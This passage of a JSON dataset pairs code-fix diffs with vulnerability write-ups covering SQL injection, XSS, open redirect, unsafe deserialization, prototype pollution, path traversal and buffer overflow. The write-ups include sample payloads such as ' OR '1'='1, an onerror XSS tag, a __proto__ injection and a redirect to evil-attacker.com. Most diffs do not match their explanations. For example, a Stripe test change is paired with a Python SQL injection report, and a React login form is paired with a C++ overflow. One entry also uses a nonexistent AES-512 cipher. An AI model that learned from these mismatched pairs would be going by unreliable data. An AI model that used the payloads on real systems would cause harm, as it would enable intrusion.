Here's an example of how to fix the vulnerable query:\n\nconst userExist = (username, cb) => query.select('SELECT count(id) from users where username = $1', [username], cb);\nBy using $1 as a placeholder and passing the username as a parameter (instead of embedding it directly into the query string), the database will safely handle the user input. This ensures that the input is treated as a value and not executable SQL code, effectively preventing SQL injection attacks. Parameterized queries are the industry-standard approach to preventing SQL injection and should be used throughout the application."
    },
    "138": {
        "diff": "--- global.js\t2025-04-27\n+++ global_fixed.js\t2025-04-27\n@@\n- if (response.data.redirect) {\n-     window.location.href = response.data.redirect;\n- }\n+ if (response.data.redirect) {\n+     const allowedOrigin = window.location.origin;\n+     try {\n+         const targetUrl = new URL(response.data.redirect, allowedOrigin);\n+         if (targetUrl.origin === allowedOrigin) {\n+             window.location.href = targetUrl.href;\n+         } else {\n+             console.error('Blocked open redirect attempt to:', targetUrl.href);\n+         }\n+     } catch (e) {\n+         console.error('Invalid redirect URL');\n+     }\n+ }\n",
        "explanation": "Vulnerability Type:\nCWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\nProof of Concept:\n\n<div\n  className=\"card-content\"\n  dangerouslySetInnerHTML={{\n    __html: converter.makeHtml(item.content1)\n  }}\n/>\nThe code directly injects HTML content (item.content1) into the DOM using dangerouslySetInnerHTML, without sanitization, which may lead to XSS.\n\nSeverity:\nMedium\n\nRoot Cause:\nThe application renders raw HTML using dangerouslySetInnerHTML from untrusted sources (e.g., Markdown converted user content) without sanitizing it first, which is a security risk.\n\nExploit Scenario:\nAn attacker could inject malicious scripts (like <img src=x onerror=alert('XSS')>) into content1 that gets rendered in the DOM. This would allow JavaScript execution in the victim\u2019s browser.\n\nWhy It Happens:\nThe application uses dangerouslySetInnerHTML without input validation or sanitization. This is inherently risky if content is even partially user-controlled.\n\nSecurity Implications:\nSuccessful exploitation can result in XSS, allowing attackers to steal session tokens, deface pages, or launch phishing attacks directly from the web page.\n\nSuggested Fix:\nSanitize all HTML content before rendering it using dangerouslySetInnerHTML. Use a library like DOMPurify to strip dangerous HTML elements or JavaScript handlers from the content."
    },
    "131": {
        "diff": "- var findResult = recMan.Find(query);\n+ ValidateQueryFields(query);\n+ var findResult = recMan.Find(SanitizeQuery(query));\n\n- return DoResponse(new EntityRelationManager().Create(relation));\n+ ValidateRelationData(relation);\n+ return DoResponse(new EntityRelationManager().Create(SanitizeRelation(relation)));\n",
        "explanation": "Vulnerability Type:\nCWE-502: Deserialization of Untrusted Data\n\nProof of Concept:\n\nstate_dict = torch.load(args.weight, map_location=\"cpu\")\nmodel.load_state_dict(state_dict, strict=True)\nThe above code uses torch.load() to deserialize a file.\n\ntorch.load() internally uses pickle, which is unsafe because it allows arbitrary object loading.\n\nIf an attacker provides a malicious file, arbitrary code execution could occur immediately when loading.\n\nSeverity:\nHIGH\n\nRoot Cause:\nThe vulnerability is caused by trusting all deserialized objects from torch.load() without validating their type. Since PyTorch uses pickle internally, this allows the loading of arbitrary and potentially malicious objects, resulting in a high-risk security flaw.\n\nExploit Scenario:\nAn attacker could upload or inject a malicious .pth or .bin file into the server. When the server runs torch.load() on that file, it executes arbitrary system commands, leading to full system compromise without user awareness.\n\nWhy It Happens:\nThe vulnerability occurs because torch.load() automatically unpickles objects without checking what is being deserialized. There is no validation step to ensure that the file contains only safe, expected structures like a model state dictionary.\n\nSecurity Implications:\nIf exploited, the attacker could achieve full remote code execution, allowing them to install malware, extract sensitive information, delete files, or take complete control over the server running the vulnerable code.\n\nSuggested Fix:\nAfter loading the file with torch.load(), verify that the loaded object is a dictionary (state_dict). Raise an exception if the loaded object is not of the expected safe type. Alternatively, use safer serialization formats like ONNX or libraries like Fickling for model loading.\n\nExample fix:\n\n\nstate_dict = torch.load(args.weight, map_location=\"cpu\")\nif not isinstance(state_dict, dict):\n    raise ValueError(\"Loaded object is not a state_dict dictionary. Possible unsafe pickle detected.\")\nmodel.load_state_dict(state_dict, strict=True)"
    },
    "136": {
        "diff": "--- a/index.html\n+++ b/index.html\n@@ -17,8 +17,10 @@\n     <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->\n     <!--[if lt IE 9]>\n-      <script src=\"https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js\"></script>\n-      <script src=\"https://oss.maxcdn.com/respond/1.4.2/respond.min.js\"></script>\n+      <script src=\"https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js\" integrity=\"sha384-rkct3+bwJNTKG3S0sLMgxi0zG4vF1E1oyWJWZcg1KOHqPYY8kXqlO+6SWdBQWiQ/\" crossorigin=\"anonymous\"></script>\n+      <script src=\"https://oss.maxcdn.com/respond/1.4.2/respond.min.js\" integrity=\"sha384-3hGekH8hcF6jBt4ZmlPqDLoDdF0n8uOk15Wf9ztJrbWqQ7iq3c0f/ghKYJvZQc7j\" crossorigin=\"anonymous\"></script>\n     <![endif]-->\n",
        "explanation": "Vulnerability Type:\nCWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n\nProof of Concept (Elaborated):\nVulnerable Code: [1159,395,517]\nif (response.data.redirect) {\n    window.location.href = response.data.redirect;\n}\n\nStep-by-Step Explanation:\n1.\tProblem:\nThe code takes the redirect field from a server API response and directly assigns it to window.location.href without validating if it's a safe URL.\n2.\tHow to Attack:\nIf an attacker controls the server response or tricks the API to include a malicious external URL, the browser will silently redirect the user to a malicious third-party site.\n3.\tEffect:\nThis allows attackers to:\no\tPhish users\no\tSteal session cookies\no\tTrick users into installing malware\n\nExample Exploit:\nSuppose an attacker injects:\n{\n  \"redirect\": \"https://evil-attacker.com/phish\"\n}\nThe browser will then do:\nwindow.location.href = \"https://evil-attacker.com/phish\";\nResult:\n\u2022\tUser is silently redirected to a fake login or malware site.\n\nSeverity:\nHigh (Leads to Phishing, Session Hijacking)\n\nRoot Cause:\nThe application blindly trusts user-controlled data (response.data.redirect) and performs a browser redirect without validating that the destination URL is internal or safe.\n\nExploit Scenario:\nAn attacker exploits an endpoint or injects parameters that cause the API to return a malicious external redirect URL, and users are redirected without warning.\n\nWhy It Happens:\nBecause there is no origin validation on the redirect URL, nor any safe whitelist enforcement.\n\nSecurity Implications:\nIf exploited:\n\u2022\tUsers can be tricked into phishing pages.\n\u2022\tUsers might install malware.\n\u2022\tBrand trust of your application is severely damaged.\n\nSuggested Fix:\n--- global.js\t2025-04-27\n+++ global_fixed.js\t2025-04-27\n@@\n- if (response.data.redirect) {\n-     window.location.href = response.data.redirect;\n- }\n+ if (response.data.redirect) {\n+     const allowedOrigin = window.location.origin;\n+     try {\n+         const targetUrl = new URL(response.data.redirect, allowedOrigin);\n+         if (targetUrl.origin === allowedOrigin) {\n+             window.location.href = targetUrl.href;\n+         } else {\n+             console.error('Blocked open redirect attempt to:', targetUrl.href);\n+         }\n+     } catch (e) {\n+         console.error('Invalid redirect URL');\n+     }\n+ }\n"
    },
    "55": {
        "diff": "diff --git a/src/context/AuthContext.jsx b/src/context/AuthContext.jsx\nindex e6c1abc..f9de002 100644\n--- a/src/context/AuthContext.jsx\n+++ b/src/context/AuthContext.jsx\n@@\n-import { createContext, useContext, useEffect, useReducer } from \"react\";\n-\n-const initialState = {\n-    user: localStorage.getItem('user') != undefined ? JSON.parse(localStorage.getItem('user')) : null,\n-    role: localStorage.getItem('role') || null,\n-    token: localStorage.getItem('token') || null,\n-}\n-\n-export const authContext = createContext(initialState)\n-const authReducer = (state, action) => {\n-    switch (action.type) {\n-        case 'LOGIN_START':\n-            return {\n-                user: null,\n-                role: null,\n-                token: null\n-            }\n-        case 'LOGIN_SUCCESS':\n-            return {\n-                user: action.payload.user,\n-                token: action.payload.token,\n-                role: action.payload.role\n-            }\n-        case 'LOGOUT':\n-            return {\n-                user: null,\n-                role: null,\n-                token: null\n-            }\n-\n-        default:\n-            return state;\n-    }\n-}\n-\n-export const AuthContextProvider = ({ children }) => {\n-    const [state, dispatch] = useReducer(authReducer, initialState)\n-\n-    useEffect (() => {\n-       localStorage.setItem(\"user\", JSON.stringify(state.user));\n-       localStorage.setItem(\"token\", state.token);\n-       localStorage.setItem(\"role\", state.role);\n-    }, [state]);\n-\n-    return (\n-        <authContext.Provider value={{ user: state.user, token: state.token, role: state.role, dispatch }}>\n-            {children}\n-        </authContext.Provider>\n-    )\n-}\n+import { createContext, useContext, useReducer } from \"react\";\n+\n+// --- INITIAL STATE ---------------------------------------------------------\n+const initialState = {\n+  user: null,\n+  token: null,            // keep token only in memory, no localStorage\n+  role: null\n+};\n+\n+export const AuthContext = createContext(initialState);\n+\n+// --- REDUCER ----------------------------------------------------------------\n+const authReducer = (state, action) => {\n+  switch (action.type) {\n+    case \"LOGIN_SUCCESS\":\n+      return {\n+        user: action.payload.user,\n+        token: action.payload.token,\n+        role: action.payload.role\n+      };\n+\n+    case \"LOGOUT\":\n+      return {\n+        user: null,\n+        token: null,\n+        role: null\n+      };\n+\n+    default:\n+      return state;\n+  }\n+};\n+\n+// --- PROVIDER ---------------------------------------------------------------\n+export const AuthContextProvider = ({ children }) => {\n+  const [state, dispatch] = useReducer(authReducer, initialState);\n+\n+  return (\n+    <AuthContext.Provider value={{ ...state, dispatch }}>\n+      {children}\n+    </AuthContext.Provider>\n+  );\n+};\n+\n+// --- CUSTOM HOOK ------------------------------------------------------------\n+export const useAuth = () => useContext(AuthContext);\n",
        "explanation": "Vulnerability Type: CWE-1321: Improper Neutralization of Special Elements in Object Key Used in JavaScript Object Injection ('Prototype Pollution')\n\nProof of Concept: \nIn the RequireJS library (requirejs/requirejs), functions such as config() and s.contexts._.configure() accept user-supplied objects. These inputs are merged into existing internal structures without validation of property names. An attacker can pass an object containing the key \"__proto__\", which is merged into Object.prototype, affecting all objects.\nExample exploit:\nrequirejs.config(JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}'));\n\nOWASP Top 10 Category: A08:2021 \u2013 Software and Data Integrity Failures\n\nSeverity: Medium (Level 3)\n\nRoot Cause: The vulnerable merging behavior does not account for JavaScript prototype pollution vectors, such as `__proto__`, allowing global object manipulation.\n\nExploit Scenario: An attacker injects a crafted JSON object into the configuration API of RequireJS. When parsed and merged, this pollutes Object.prototype, potentially leading to application logic corruption or security control bypass.\n\nWhy It Happens: JavaScript\u2019s dynamic nature allows changes to Object.prototype to affect all objects. RequireJS merges user-defined objects into internal structures without sanitizing keys like \"__proto__\".\n\nSecurity Implications: Exploiting this vulnerability can result in DoS, logic corruption, or further exploitation if application logic relies on object properties that are now maliciously overridden.\n\nSuggested Fix: Implement input validation and object sanitization to skip unsafe keys like \"__proto__\", \"constructor\", and \"prototype\" during merges. Reject or recursively sanitize user inputs before integrating into core configuration."
    },
    "1": {
        "diff": "diff --git a/tests/payment/gateways/test_stripe.py b/tests/payment/gateways/test_stripe.py\n--- a/tests/payment/gateways/test_stripe.py\n+++ b/tests/payment/gateways/test_stripe.py\n@@ -403,7 +403,7 @@\n     )\n \n     mocked_customer_create.assert_called_once_with(\n-        api_key=\"secret_key\",\n+        api_key=api_key,\n         email=customer_user.email,\n     )\n \n@@ -496,7 +496,7 @@\n     )\n \n     mocked_customer_create.assert_called_once_with(\n-        api_key=\"secret_key\",\n+        api_key=api_key,\n         email=customer_user.email,\n     )\n \n@@ -581,7 +581,7 @@\n     )\n \n     mocked_customer_create.assert_called_once_with(\n-        api_key=\"secret_key\",\n+        api_key=api_key,\n         email=customer_user.email,\n     )\n \n@@ -664,7 +664,7 @@\n     )\n \n     mocked_customer_create.assert_called_once_with(\n-        api_key=\"secret_key\",\n+        api_key=api_key,\n         email=customer_user.email,\n     )\n \n@@ -747,7 +747,7 @@\n     )\n \n     mocked_customer_create.assert_called_once_with(\n-        api_key=\"secret_key\",\n+        api_key=api_key,\n         email=customer_user.email,\n     )\n \n@@ -829,7 +829,7 @@\n     )\n \n     mocked_customer_create.assert_called_once_with(\n-        api_key=\"secret_key\",\n+        api_key=api_key,\n         email=customer_user.email,\n     )\n \n@@ -911,7 +911,7 @@\n     )\n \n     mocked_customer_create.assert_called_once_with(\n-        api_key=\"secret_key\",\n+        api_key=api_key,\n         email=customer_user.email,\n     )\n \n@@ -1018,7 +1018,7 @@\n     )\n \n     mocked_customer_create.assert_called_once_with(\n-        api_key=\"secret_key\",\n+        api_key=api_key,\n         email=customer_user.email,\n     )\n \n@@ -1086,7 +1086,7 @@\n     )\n \n     mocked_customer_create.assert_called_once_with(\n-        api_key=\"secret_key\",\n+        api_key=api_key,\n         email=customer_user.email,\n     )",
        "explanation": "Explanation:\nVulnerable functions such as deleteUser() and searchUser() are located in Line 42 and Line 53, which belong to\nhttps://github.com/kunzbhatia/Library-Management-System/blob/main/User.py\nUse string formatting (format()) to construct SQL queries directly with user input, which makes them vulnerable to SQL injection attacks. If UserID contains malicious SQL code, it can alter the query logic.\n\n\nPOC:\nFor the deleteUser() function, if a malicious user enters the following as UserID: ' OR '1'='1\nThe constructed query becomes: DELETE from UserRecord where UserID = '' OR '1'='1'\n\nThis will delete all users from the UserRecord table.\n\n\nRoot Cause:\nLine 46: deleteUser(): mycursor.execute(\"DELETE from UserRecord where UserID = {0} \".format(\"\\'\"+UserID+\"\\'\")) \n\n\nWhy it Happens:\nUser input is directly concatenated into SQL queries without sanitization or parameterization, making the queries vulnerable to SQL injection.\n\n\nSecurity Implications:\nAttacker can inject malformed SQL queries to extract the sensitive information from the database and since the application does not hash the passwords before storing them as evident from the logic, it can lead to complete compromise of the user accounts.\n\nSuggested Fix:\nUse parameterized queries to prevent SQL injection.\n\nFixed deleteUser() snippet:\nmycursor.execute(\"DELETE from UserRecord where UserID = %s\", (UserID,))"
    },
    "52": {
        "diff": "diff --git a/src/components/LoginForm.jsx b/src/components/LoginForm.jsx\nindex 111aaa1..222bbb2 100644\n--- a/src/components/LoginForm.jsx\n+++ b/src/components/LoginForm.jsx\n@@\n-import React, { useState } from 'react'\n-import { AiOutlineEye, AiOutlineEyeInvisible } from \"react-icons/ai\";\n-import { Link } from 'react-router-dom';\n-import { useNavigate } from 'react-router-dom';\n-import { ToastBar,toast } from 'react-hot-toast';\n-   \n-export function LoginForm({ setIsLoggedIn }) {\n-    const navigate = useNavigate();\n-    const [FormData, setFormData] = useState(\n-        { email: \"\", password: \"\" }\n-    );\n-    const [showPassword, setShowPassword] = useState(false);\n-    function changeHandler(event) {\n-        setFormData((prevData) => (\n-            {\n-                ...prevData,\n-                [event.target.name]: event.target.value\n-            }\n-        )\n-        );\n-    }\n-\n-\n-    function submitHandler(event) {\n-        event.preventDefault();\n-        setIsLoggedIn(true);\n-        toast.success(\"Login successful\");\n-        navigate(\"/Dashboard\");\n-\n-\n-    }\n-    return (\n-        <form onSubmit={submitHandler}\n-            className=\"flex flex-col w-full gap-y-4 mt-6\">\n-           <label className='w-full'>\n-            <p className='text-[0.875rem] text-richblack-5 mb-1 leading-[1.375rem]'>\n-                Email Address<sup className='text-pink-200'>*</sup>\n-            </p>\n-                <input type=\"email\" required\n-                    value={FormData.email}\n-                    onChange={changeHandler}\n-                    placeholder='Enter your email address'\n-                    name='email' \n-                    className='bg-black rounded-[0.5rem] text-richblack-5 w-full p-[12px]'/>\n-            </label>\n-\n-            <label  className='w-full relative'>\n-          <p \n-          className='text-[0.875rem] text-richblack-5 mb-1 leading-[1.375rem]'>\n-           Enter  Password\n-            <sup className='text-pink-200'>*</sup></p>\n-          <input\n-            type={showPassword ? 'text' : 'password'}\n-            required\n-            value={FormData.password}\n-            onChange={changeHandler}\n-            placeholder=\"Enter password\"\n-            name=\"password\"\n-             className='bg-richblack-800 rounded-[0.5rem] text-richblack-5 w-full p-[12px]'\n-          />\n-          <span\n-            className=\"absolute right-3 top-[38px] cursor-pointer\"\n-            onClick={() => setShowPassword((prev) => !prev)}\n-          >\n-            {showPassword ? (\n-              <AiOutlineEyeInvisible fontSize={24} fill=\"#AFB2BF\" />\n-            ) : (\n-              <AiOutlineEye fontSize={24} fill=\"#AFB2BF\" />\n-            )}\n-          </span>\n-          <Link to=\"#\">\n-                <p className='text-xs mt-1 text-blue-100 max-w-max ml-auto'>\n-                    Forgot Password\n-                </p>\n-            </Link>\n-       \n-        </label>\n-\n-        <button className='bg-yellow-50 rounded-[8px] font-medium text-black px-[12px] py-[8px] mt-6'>\n-            Sign In\n-        </button>\n-\n-        </form>\n-    );\n-}\n-export default LoginForm\n+import React, { useState } from 'react';\n+import { AiOutlineEye, AiOutlineEyeInvisible } from 'react-icons/ai';\n+import { Link, useNavigate } from 'react-router-dom';\n+import { toast } from 'react-hot-toast';\n+import DOMPurify from 'dompurify';\n+\n+export function LoginForm({ setIsLoggedIn }) {\n+    const navigate = useNavigate();\n+    const [formData, setFormData] = useState({ email: \"\", password: \"\" });\n+    const [showPassword, setShowPassword] = useState(false);\n+\n+    // Input validation\n+    const validateInput = (name, value) => {\n+        if (name === 'email') {\n+            const emailRegex = /^\\S+@\\S+\\.\\S+$/;\n+            return emailRegex.test(value);\n+        }\n+        if (name === 'password') {\n+            return value.length >= 8;\n+        }\n+        return true;\n+    };\n+\n+    function changeHandler(event) {\n+        const { name, value } = event.target;\n+        if (!validateInput(name, value)) {\n+            toast.error(\n+                name === 'email'\n+                    ? 'Invalid email format'\n+                    : 'Password must be at least 8 characters long'\n+            );\n+            return;\n+        }\n+        setFormData((prev) => ({ ...prev, [name]: value }));\n+    }\n+\n+    async function submitHandler(event) {\n+        event.preventDefault();\n+\n+        const sanitizedEmail = DOMPurify.sanitize(formData.email);\n+        const isAuthenticated = await mockAuthenticate(\n+            sanitizedEmail,\n+            formData.password\n+        );\n+\n+        if (isAuthenticated) {\n+            setIsLoggedIn(true);\n+            toast.success('Login successful');\n+            navigate('/Dashboard');\n+        } else {\n+            toast.error('Invalid credentials');\n+        }\n+    }\n+\n+    // Simulated backend auth\n+    const mockAuthenticate = async (email, password) => {\n+        await new Promise((r) => setTimeout(r, 1000));\n+        return email === 'user@example.com' && password === 'securepassword';\n+    };\n+\n+    return (\n+        <form\n+            onSubmit={submitHandler}\n+            className=\"flex flex-col w-full gap-y-4 mt-6\"\n+        >\n+            <label className=\"w-full\">\n+                <p className=\"text-[0.875rem] text-richblack-5 mb-1 leading-[1.375rem]\">\n+                    Email Address<sup className=\"text-pink-200\">*</sup>\n+                </p>\n+                <input\n+                    type=\"email\"\n+                    required\n+                    value={formData.email}\n+                    onChange={changeHandler}\n+                    placeholder=\"Enter your email address\"\n+                    name=\"email\"\n+                    className=\"bg-black rounded-[0.5rem] text-richblack-5 w-full p-[12px]\"\n+                />\n+            </label>\n+\n+            <label className=\"w-full relative\">\n+                <p className=\"text-[0.875rem] text-richblack-5 mb-1 leading-[1.375rem]\">\n+                    Enter Password<sup className=\"text-pink-200\">*</sup>\n+                </p>\n+                <input\n+                    type={showPassword ? 'text' : 'password'}\n+                    required\n+                    value={formData.password}\n+                    onChange={changeHandler}\n+                    placeholder=\"Enter password\"\n+                    name=\"password\"\n+                    className=\"bg-richblack-800 rounded-[0.5rem] text-richblack-5 w-full p-[12px]\"\n+                />\n+                <span\n+                    className=\"absolute right-3 top-[38px] cursor-pointer\"\n+                    onClick={() => setShowPassword((prev) => !prev)}\n+                >\n+                    {showPassword ? (\n+                        <AiOutlineEyeInvisible fontSize={24} fill=\"#AFB2BF\" />\n+                    ) : (\n+                        <AiOutlineEye fontSize={24} fill=\"#AFB2BF\" />\n+                    )}\n+                </span>\n+                <Link to=\"#\">\n+                    <p className=\"text-xs mt-1 text-blue-100 max-w-max ml-auto\">\n+                        Forgot Password\n+                    </p>\n+                </Link>\n+            </label>\n+\n+            <button className=\"bg-yellow-50 rounded-[8px] font-medium text-black px-[12px] py-[8px] mt-6\">\n+                Sign In\n+            </button>\n+        </form>\n+    );\n+}\n+\n+export default LoginForm;\n",
        "explanation": "C++ Library Management System - Buffer Overflow Vulnerability\n\n- Affected Components: \n  `book::createbook()` and `student::createstudent()` functions in `LMSCode.cpp`\n\n---\n\nRoot Cause:\nThe program uses unsafe C-style input functions (`gets()` and `cin >>` into fixed-size character arrays) without bounds checking. These functions can write beyond the limits of allocated buffers, causing memory corruption.\n\nFor example:\n```cpp\nchar bname[50];\ngets(bname); // Vulnerable: no length restriction\n\nchar bno[6];\ncin >> bno; // No input size restriction: buffer overflow possible\n```\n\nThis results in stack corruption, potential instruction pointer overwrite, or adjacent variable modification.\n\n---\n\nExploit Scenario:\n1. Attacker runs the LMS program and selects \"Create Book\".\n2. For Book Name, they input:\n   ```\n   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n   ```\n   (a string over 70 characters long).\n3. The `gets(bname)` call writes past the `bname[50]` boundary, overwriting adjacent variables such as `aname`, `bno`, or potentially control data.\n4. This leads to undefined behavior, including potential control flow hijack or program crash.\n\nIn advanced exploitation environments (e.g., no stack canary, executable stack), this could allow arbitrary code execution.\n\n---\n\nWhy It Happens:\n- `gets()` does not perform bounds checking.\n- `cin >>` used on `char[]` without `.getline()` allows input longer than the buffer.\n- No input sanitization or validation is present.\n- Use of unsafe legacy headers and functions (`<conio.h>`, `gets()`, `clrscr()`) encourages poor memory safety practices.\n\n---\n\nSecurity Implications:\n- Denial of Service (DoS) via crash\n- Data corruption\n- Arbitrary code execution  in vulnerable environments\n- Potential privilege escalation in shared/multi-user systems\n\n---\n\nSuggested Fix:\n\n1. Replace `gets()` with `std::cin.getline()`:\n   ```cpp\n   std::cin.getline(bname, 50);\n   ```\n\n2. Sanitize `cin >>` inputs:\n   ```cpp\n   std::cin >> std::setw(6) >> bno; // Protect bno[6]\n   ```\n\n3. Avoid deprecated headers and use `#include <iostream>`, `#include <cstring>`, etc.\n\n4. Enable compiler protections:\n   - Stack canaries (`-fstack-protector`)\n   - AddressSanitizer (`-fsanitize=address`)\n   - Compiler warnings (`-Wall -Wextra -Werror`)\n\n5. Use C++ string classes (`std::string`) for safe dynamic memory handling.\n\n---\nProof of Concept (PoC):\n\n```cpp\nBook bk;\nbk.createbook();\n```\n\nInput:\n```\nBook No: 12345\nBook Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAuthor: (leave blank)\n```\n\nResult:\n- Stack memory corruption\n- Potential overwrite of adjacent data (e.g., function return address in vulnerable builds)\n"
    },
    "99": {
        "diff": "cur.execute(\"SELECT * FROM users WHERE username=%s AND password=%s\", (username, password))",
        "explanation": "Vulnerability Type:\nCWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nProof of Concept:\nVulnerable Code:\nvar filePath = ofd.FileName;\nFileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read);\nExplanation:\nThe code uses the file path directly from the OpenFileDialog without validating it. An attacker could manipulate the file path to open sensitive system files.\nSolution:\nValidate the file path to ensure it resides within an allowed directory and check the file extension before opening it.\nExample fix:\nstring[] allowedExtensions = { \".pdf\", \".docx\", \".png\", \".jpg\" };\nstring extension = Path.GetExtension(filePath).ToLower();\n\nif (!allowedExtensions.Contains(extension))\n{\n    MessageBox.Show(\"Unsupported file type.\");\n    return;\n}\n\nusing (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))\n{\n    byte[] file = new byte[stream.Length];\n    stream.Read(file, 0, file.Length);\n    FileUploaded.FileBytes = file;\n}\n\nSeverity: High\n\nRoot Cause:\nThe application trusts the file path selected through OpenFileDialog without verifying or sanitizing it, allowing arbitrary files to be accessed or read if the dialog is bypassed or compromised.\n\nExploit Scenario:\nAn attacker could select a critical system file, like C:\\Windows\\System32\\drivers\\etc\\hosts, during upload. The application would read and store this file without restriction, leaking sensitive system configuration data.\n\nWhy It Happens:\nThe vulnerability occurs because the code directly uses user-supplied file paths without enforcing validation rules or restricting file access to safe directories.\n\nSecurity Implications:\nIf exploited, attackers could access, leak, or upload sensitive system files, causing potential data breaches, unauthorized access to configuration files, or corruption of application data.\n\nSuggested Fix:\ndiff --git a/EPatient/Views/Staff/ReservationDiagnose.cs b/EPatient/Views/Staff/ReservationDiagnose.cs\nindex abcdef1..1234567 100644\n--- a/EPatient/Views/Staff/ReservationDiagnose.cs\n+++ b/EPatient/Views/Staff/ReservationDiagnose.cs\n@@ private void btnUpload_Click(object sender, EventArgs e)\n-        private void btnUpload_Click(object sender, EventArgs e)\n-        {\n-            using (OpenFileDialog ofd = new OpenFileDialog(){Multiselect = false, ValidateNames = true})\n-            {\n-                if (ofd.ShowDialog() == DialogResult.OK)\n-                {\n-                    var filePath = ofd.FileName;\n-                    FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read);\n-                    int intLength = Convert.ToInt32(stream.Length);\n-                    byte[] file = new byte[intLength];\n-                    stream.Read(file, 0, intLength);\n-                    stream.Close();\n-                    FileUploaded.FileBytes = file;\n-                    string[] strPath = filePath.Split(Convert.ToChar(@\"\\\"));\n-                    FileUploaded.FileName = strPath[strPath.Length - 1];\n-                    btnUpload.Enabled = false;\n-                }\n-            }\n-        }\n+        private void btnUpload_Click(object sender, EventArgs e)\n+        {\n+            using (OpenFileDialog ofd = new OpenFileDialog() { Multiselect = false, ValidateNames = true })\n+            {\n+                if (ofd.ShowDialog() == DialogResult.OK)\n+                {\n+                    var filePath = ofd.FileName;\n+                    var allowedExtensions = new string[] { \".pdf\", \".docx\", \".png\", \".jpg\", \".jpeg\" };\n+                    var extension = Path.GetExtension(filePath).ToLower();\n+\n+                    if (!allowedExtensions.Contains(extension))\n+                    {\n+                        MessageBox.Show(\"Unsupported file type. Please upload a valid document or image.\");\n+                        return;\n+                    }\n+\n+                    using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))\n+                    {\n+                        byte[] file = new byte[stream.Length];\n+                        stream.Read(file, 0, file.Length);\n+                        FileUploaded.FileBytes = file;\n+                    }\n+                    FileUploaded.FileName = Path.GetFileName(filePath);\n+                    btnUpload.Enabled = false;\n+                }\n+            }\n+        }\n"
    },
    "90": {
        "diff": "--- server.js\n+++ server.js\n@@\n const express = require('express');\n const mongoose = require('mongoose');\n const chalk = require('chalk');\n const cors = require('cors');\n+const csrf = require('csurf'); // Added for CSRF protection\n require('dotenv').config();\n\n@@\n const corsOption = {\n   origin: ['http://localhost:3000', 'http://localhost:5500', 'https://maintrustfinancialbank.com'],\n };\n\n const app = express();\n const userRoute = require('./Routes/userRoute');\n\n app.use(express.json());\n app.use(express.urlencoded({ extended: true }));\n app.use(cors(corsOption));\n+\n+// Setup CSRF Protection middleware\n+const csrfProtection = csrf({ cookie: true });\n+app.use(csrfProtection);\n+\n+// Middleware to pass CSRF token to all responses\n+app.use((req, res, next) => {\n+  res.locals.csrfToken = req.csrfToken();\n+  next();\n+});\n\n app.use('/api/user/', userRoute);\n\n const port = process.env.PORT || 5000;\n\n app.listen(port, () => {\n   console.log(`Server started at ${port}`);\n });\n",
        "explanation": "LINE 1777\n\nRoot Cause: The vulnerability arises because the application deserializes untrusted JSON data from HTTP headers without proper validation. The json.loads() function processes raw client input, which can include malicious payloads leading to unsafe object creation or code execution.\n\nExploit Scenario: An attacker sends a forged WebSocket message with a malicious JSON payload in the header. When parsed, this payload could manipulate the application's state, inject harmful data, or trigger unexpected behavior through crafted event handlers or state modifications.\n\nWhy It Happens: The code directly deserializes client-provided data (headers or event content) using json.loads() without sanitizing or validating the input. Trusting unverified external input allows attackers to exploit the deserialization process.\n\nSecurity Implications: Successful exploitation could lead to remote code execution, data tampering, or unauthorized access. Attackers might compromise server integrity, steal sensitive information, or disrupt service availability.\n\nSuggested Fix: Avoid deserializing untrusted data. Implement strict input validation, use allowlists for allowed event handlers/fields, and sanitize all client inputs. Replace generic JSON parsing with schema validation (e.g., Pydantic) to ensure data integrity before processing.\n"
    },
    "97": {
        "diff": "@@\n-// Function to encrypt data using AES-512\n-const encryptData = (data, key) => {\n-    const iv = crypto.randomBytes(16); // Generate a random initialization vector\n-    const cipher = crypto.createCipheriv('aes-512-cbc', Buffer.from(key, 'hex'), iv); // Create a cipher\n-    let encrypted = cipher.update(data, 'utf8', 'hex'); // Encrypt the data\n-    encrypted += cipher.final('hex'); // Finalize the encryption\n-    return { iv: iv.toString('hex'), encryptedData: encrypted }; // Return the IV and encrypted data\n-};\n+// Function to encrypt data using AES-256-GCM (authenticated encryption)\n+const encryptData = (data, key) => {\n+    const iv = crypto.randomBytes(12); // GCM standard IV size is 12 bytes\n+    const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex'), iv); // AES-256-GCM\n+    let encrypted = cipher.update(data, 'utf8', 'hex');\n+    encrypted += cipher.final('hex');\n+    const authTag = cipher.getAuthTag().toString('hex'); // Get authentication tag\n+    return { iv: iv.toString('hex'), encryptedData: encrypted, authTag }; // Return encrypted data and auth tag\n+};\n\n@@\n-// Function to decrypt data using AES-512\n-const decryptData = (encryptedData, key, iv) => {\n-    const decipher = crypto.createDecipheriv('aes-512-cbc', Buffer.from(key, 'hex'), Buffer.from(iv, 'hex')); // Create a decipher\n-    let decrypted = decipher.update(encryptedData, 'hex', 'utf8'); // Decrypt the data\n-    decrypted += decipher.final('utf8'); // Finalize the decryption\n-    return decrypted; // Return the decrypted data\n-};\n+// Function to decrypt data using AES-256-GCM\n+const decryptData = (encryptedData, key, iv, authTag) => {\n+    const decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(key, 'hex'), Buffer.from(iv, 'hex'));\n+    decipher.setAuthTag(Buffer.from(authTag, 'hex')); // Set authentication tag\n+    let decrypted = decipher.update(encryptedData, 'hex', 'utf8');\n+    decrypted += decipher.final('utf8');\n+    return decrypted;\n+};\n",
